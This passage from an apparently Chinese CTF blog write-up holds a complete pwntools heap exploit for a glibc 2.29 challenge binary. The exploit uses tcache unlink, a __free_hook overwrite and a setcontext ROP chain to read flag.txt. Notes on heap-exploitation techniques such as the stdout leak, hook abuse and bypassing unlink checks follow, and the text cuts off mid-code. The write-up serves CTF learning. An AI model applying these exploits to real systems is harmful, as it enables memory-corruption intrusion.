p64(p_rdi)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">2</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&#x27;</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>通过在tcache上伪造chunk,通过对chunk的count联合伪造size,0x20,0x30chunk的地址伪造fd,bk,以此进行unlink</p><ol><li>泄露heap基址,libc基址</li><li>利用前一个泄露libc的chunk(其它chunk也行)来uaf,并多次double free布置tcache结构体中的fake chunk</li><li>uaf修改一个chunk来触发unlink_tcache中的fake chunk</li><li>触发unlink</li><li>分配出tcahe_perthread_struct,在0x220写上free_hook</li><li>选择一个chunk布置好各类参数</li><li>free触发</li></ol><p>其中3的具体步骤是:</p><ol><li>free一个0x21的chunk</li><li>free一个0x31的chunk</li><li>free一个0x3a1的chunk</li><li>free两个0x3b1的chunk</li></ol><p>其中0下21和0x31的chunk要是同一个</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,name</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">26976</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./op&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x0000000000015BB)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *setcontext+53&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x480</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">info(<span class="string">&quot;heap : &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">length = <span class="number">0xe0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x3a1</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x3a8</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0x300</span>) + p64(<span class="number">0x570</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(heap + <span class="number">0x40</span>) + p64(heap + <span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x100</span> + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">cmd(<span class="built_in">str</span>(<span class="number">50056</span>))</span><br><span class="line"><span class="comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span></span><br><span class="line">p.send(p64(libc.address+<span class="number">0x000000000012be97</span>))<span class="comment">#just edit hook not chunk</span></span><br><span class="line"><span class="comment"># 0x7f903816ae35 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR [rdx+0xa0]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae3c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR [rdx+0x80]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae43 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR [rdx+0x78]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae47 &lt;setcontext+71&gt;:mov    r12,QWORD PTR [rdx+0x48]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4b &lt;setcontext+75&gt;:mov    r13,QWORD PTR [rdx+0x50]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4f &lt;setcontext+79&gt;:mov    r14,QWORD PTR [rdx+0x58]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae53 &lt;setcontext+83&gt;:mov    r15,QWORD PTR [rdx+0x60]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae57 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5e &lt;setcontext+94&gt;:push   rcx</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5f &lt;setcontext+95&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae63 &lt;setcontext+99&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae67 &lt;setcontext+103&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae6e &lt;setcontext+110&gt;:mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae72 &lt;setcontext+114&gt;:mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae76 &lt;setcontext+118&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7d &lt;setcontext+125&gt;:xor    eax,eax</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7f &lt;setcontext+127&gt;:ret    </span></span><br><span class="line"><span class="comment"># 00000000000026542: pop rdi; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000012bdc9: pop rdx; pop rsi; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment"># 0x00000000000cf6c5: syscall; ret;x</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000026542</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x0000000000047cf8</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc.address</span><br><span class="line">payload = p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span>)+p64(heap+<span class="number">0x1ac0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;flag.txt&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1ad0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1b78</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="0x1chunk地址"><a href="#0x1chunk地址" class="headerlink" title="0x1chunk地址"></a>0x1chunk地址</h2><p>程序(有缓冲)在运行中进行第一次io操作时<u><strong>(i操作申请一个,o操作申请一个)</strong></u>,都会申请两个chunk(应该是stdin和stdout的缓冲区)</p><p>不过还不确定跟环境有没有关系</p><p><strong>已知：</strong></p><ol><li>如果程序有setbuf(stdin/stdout/stderr,0)操作的话就只会申请一个chunk了,且是大小结尾为0x90那个(应该是stdout的缓冲区)，对单独程序可以先行调试看看——-<strong><u>与setbuf有关</u></strong></li><li>又发现有没有这两个chunk还跟<strong>动态库libc和动态链接器ld的版本有关系</strong>，原装环境存在iochunk,但在切换动态版本后却没有这两个chunk，切换动态库和链接器后再次调试确定———<strong><u>与动态版本有关</u></strong></li><li>还与程序唤起方式有关<strong>,gdb唤起</strong>与<strong>pwntools唤起</strong>亦有差异,二者可能一个有一个没有——-<strong><u>与唤起方式有关</u></strong></li></ol><p>在固定环境下,由于页对齐的原因,申请的chunk的地址低位一般都是固定的,可以用gdb观测,依此通过partial overwrite等我们能够达到许多目的</p><h2 id="0x2hook执行参数"><a href="#0x2hook执行参数" class="headerlink" title="0x2hook执行参数"></a>0x2hook执行参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//_libc_free</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_malloc</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_realloc</span></span><br></pre></td></tr></table></figure><p>可以看到,hook不为空时,执行hook指向函数时的参数是由其包装函数决定的</p><ol><li>free执行时,是以所要释放chunk的mem指针作为参数</li><li>malloc和realloc都是以申请chunk大小(用户申请,非实际大小)为参数</li></ol><p>对于2来说,hook基本只能是onegadget了</p><p>但对于1来说,若在chunk中填入一些字符(如/bin/sh),则<strong>除了onegadget外,也可以直接调用system等函数</strong>,这题就是这样</p><h2 id="0x3mmap所分配chunk"><a href="#0x3mmap所分配chunk" class="headerlink" title="0x3mmap所分配chunk"></a>0x3mmap所分配chunk</h2><p>当申请chunk大小大于或接近top_chunk时,会创建mmap段并在mmap段中分配</p><p>分配的chunk的实际地址就是该mmap段的开始地址</p><p>且mmap段与libc.so段之间的偏移是固定的</p><p>在不能泄露libc的情况下可以用其相对偏移得到libc地址</p><h2 id="0x4双hook配合"><a href="#0x4双hook配合" class="headerlink" title="0x4双hook配合"></a>0x4双hook配合</h2><p>大多数时候,malloc_hook和realloc_hook(二者地址相邻)的fastbinchunk伪造都能寻找到合适的fakechunk,但free_hook则更难找到</p><p>当one_gadget直接使用都不能满足条件时,则要先跳转到realloc进行栈帧调整(调整多少,可以通过跳转偏移来控制),之后调用realloc_hook执行onegadget</p><h2 id="0x5-fini-array"><a href="#0x5-fini-array" class="headerlink" title="0x5.fini_array"></a>0x5.fini_array</h2><p>程序正常退出时会由_dl_fini(_dl_fini+823左右)调用<code>.fini_array</code>地址处的函数，<strong>不过只能利用一次</strong>。只能利用一次是因为栈上的环境等肯定变化了，返回地址等自然也变化了</p><p>在没开pie的情况下利用还是很简单的</p><h2 id="0x6调试细节"><a href="#0x6调试细节" class="headerlink" title="0x6调试细节"></a>0x6调试细节</h2><p>一直以来都被这个调试搞得很烦,gdb常常不在exp中我所需要的地方开始,偶尔还不能加载符号表…</p><p>苦于找不到相关的资料,只能之际摸索,总算找到解决方案了</p><h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p><strong>程序由gdb运行和pwntools运行这两种方式,唤起的程序的环境有些许不同</strong></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>先说有时候无法加载符号表,导致无法正常调试</p><p>多次实验后发现起因是—exp一路打通了shell所导致</p><p><strong>解决方案:</strong>在p.interactive()函数前使用命令<strong>sleep(1)或pause()</strong>使得程序停下来</p><p>这样便能加载符号表了</p><h3 id="合适的调试起始位置"><a href="#合适的调试起始位置" class="headerlink" title="合适的调试起始位置"></a>合适的调试起始位置</h3><p>经常attach上去发现不是自己想要的位置,导致调试困难</p><p><strong>解决方案:</strong>在gdb.attach()下方使用命令<strong>sleep(1)或pause()</strong>使得程序停下来,然后再<strong>配合backtrace</strong>找到合适的断点,进入正确的流程便可,(有时会被read卡住,需要再发送点东西)</p><p>需要注意如果没找到合适的断点的话,可能会出现一些奇怪的错误</p><p><strong>注意:</strong>gdb后组合pause可能会致使发生一些原本不存在的牛马问题</p><h3 id="另一种调试方式"><a href="#另一种调试方式" class="headerlink" title="另一种调试方式"></a>另一种调试方式</h3><p>由于pwntools中gdb常用是attach附加到一个进程上,所以完全可以,早早打开gdb,然后在命令行中输入交互指令并发送,然后在gdb中逐步向下运行到需要调试的地方,(有时会被read卡住,需要再发送点东西)</p><h2 id="0x7main-arena偏移的获取"><a href="#0x7main-arena偏移的获取" class="headerlink" title="0x7main_arena偏移的获取"></a>0x7main_arena偏移的获取</h2><p>因为不能直接搜索符号main_arena,所以只能间接获得</p><p><code>main_arena_offset = libc.symbols[&#39;__malloc_hook&#39;] + 0x10</code></p><p>即main_arena在__malloc_hook向后0x10处</p><h2 id="0x8calloc分配的chunk"><a href="#0x8calloc分配的chunk" class="headerlink" title="0x8calloc分配的chunk"></a>0x8calloc分配的chunk</h2><p><code>malloc</code>分配的内存块的内容是不确定的，它可能包含之前被使用的数据残留。而<code>calloc</code>函数分配的内存块在分配时会被初始化为零，也就是说，每个字节都被设置为\0。</p><p>若存在tcache,calloc分配chunk不通过TCACHE,但依然会触发剩余chunk进入tcache</p><h2 id="0x9-maloc-hook附近的fake-chunk"><a href="#0x9-maloc-hook附近的fake-chunk" class="headerlink" title="0x9 __maloc_hook附近的fake_chunk"></a>0x9 __maloc_hook附近的fake_chunk</h2><p>一般情况下找到的能够控制到__maloc_hook的fake_chunk的大小都是<strong>0x7f</strong>,在main_arena前附近</p><h2 id="0xa-PIE的一种应对方式"><a href="#0xa-PIE的一种应对方式" class="headerlink" title="0xa PIE的一种应对方式"></a>0xa PIE的一种应对方式</h2><p>当开启pie后,利用方式与不开启有明显差异,一种比较常见的应对方式是<strong>尾地址部分改写</strong></p><p><strong>利用后12位不变性以及页对齐带来的堆地址结尾可观测性</strong></p><p>通过只改写部分数据来达到错位访问所需内存的目的</p><p>在堆中因为要出现堆地址,所以一般要先释放两个大小相同chunk,以达到通过fd获取某个chunk的地址,之后再部分写</p><h2 id="0xb-unsortedbin-chunk处理"><a href="#0xb-unsortedbin-chunk处理" class="headerlink" title="0xb unsortedbin-chunk处理"></a>0xb unsortedbin-chunk处理</h2><p>unsortedbin 是FIFO,头插尾取,寻找chunk主要利用bk指针</p><p>进入unsortedbin的chunk如果<strong>相邻会<u>立即合并</u></strong></p><p>并修改其后一个非freechunk的prev_size字段</p><p>unsortedbin中切割chunk时,分配出的chunk是前半部分,依然存在unsorted中的remainer则是后半部分,其实其他chunk切割也是这样</p><h2 id="0xc-prev-size字段何时变化"><a href="#0xc-prev-size字段何时变化" class="headerlink" title="0xc prev_size字段何时变化"></a>0xc prev_size字段何时变化</h2><p>prev_size字段只在上一个chunk为free状态时起作用</p><p>prev_size字段主要被修改在两种情况:</p><ol><li>合并chunk</li><li>分割chunk</li></ol><p><strong>第一种情况:</strong></p><p>合并chunk时修改其下一个chunk的prev_size字段</p><p><strong>第二种情况:</strong></p><p>修改剩余部分的下一个chunk的prev_size,其实依然是分割前的下一个chunk的prev_size,其不会修改剩余部分chunk的prev_size字段,因为前半部分处于使用状态显然不会去修改他</p><h2 id="0xd-io-overflow相关"><a href="#0xd-io-overflow相关" class="headerlink" title="0xd io_overflow相关"></a>0xd io_overflow相关</h2><p> <code>puts</code>等函数，会最终调用到 <code>_IO_new_file_overflow</code></p><p>而该函数会最终使用 <code>_IO_do_write</code> 进行真正的输出。</p><p>在输出时，如果具有缓冲区，会输出 <code>_IO_write_base</code> 开始的缓冲区内容，直到 <code>_IO_write_ptr</code> （也就是将 <code>_IO_write_base</code> 一直到 <code>_IO_write_ptr</code> 部分的值当做缓冲区</p><p>在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中）</p><p>但是在 <code>setbuf</code> 后，理论上会不使用缓冲区。然而如果能够修改 <code>_IO_2_1_stdout_</code> 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 <code>_IO_write_base</code> 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。</p><p>_IO_2_1_stdout与main_arena相距较近,部分写获得该区域作为chunk</p><p>flag满足条件后(<strong>flag==0xfbad1800</strong>)</p><p>当 <code>_IO_write_base</code>与<code>_IO_write_ptr</code>不相等时调用puts等时立即输出从_IO_write_base开始的内容</p><h2 id="0xe-chunk合并检测"><a href="#0xe-chunk合并检测" class="headerlink" title="0xe chunk合并检测"></a>0xe chunk合并检测</h2><p>释放chunk检测合并时,先检测上一个是否空闲,再检测下一个是否是topchunk,如果不是则检测下一个chunk</p><p>而合并会用到unlink宏,unlink中其中一个检测是检测该chunk的size是否与其下一个chunk的prev_size相等,注意其只是检测相等,并且下一个chunk是通过该chunk+size偏移得到的,一般都是相等的(自己构造的另说)</p><p>这也就是说如果任意修改一个chunk的prev_size字段并触发合并,只要这个chunk-prev_size刚好是一个chunk的起始地址,那么unlink检测就会通过,它不会比较我们修改的prev_size是否等于找到的chunk的size,而是用找到的chunk和利用该chunk的size找到的chunk的prev_size作比较</p><h2 id="0xf-无free时topchunk的利用"><a href="#0xf-无free时topchunk的利用" class="headerlink" title="0xf 无free时topchunk的利用"></a>0xf 无free时topchunk的利用</h2><p>当程序没有free功能时,若能够修改topchunk的size,可以减小topchunk的大小,再申请一个比修改后大小更大的chunk使之加入unsortedbin,这样可以利用unsortedbin去泄露libc</p><p>在申请的堆块大小大于 top chunk的大小时会调用 sysmalloc 来分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    If have mmap, and the request size meets the mmap threshold, and</span><br><span class="line">    the system supports mmap, and there are few enough currently</span><br><span class="line">    allocated mmapped regions, try to directly map this request</span><br><span class="line">    rather than expanding top.</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line"> if (av == NULL</span><br><span class="line">     || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</span><br><span class="line">     &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">   &#123;</span><br><span class="line">     char *mm;           /* return value from mmap call*/</span><br><span class="line"></span><br><span class="line">   try_mmap:</span><br></pre></td></tr></table></figure><p>如果申请大小 &gt; (unsigned long) (mp_.mmap_threshold) 就会直接 mmap 出一块内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 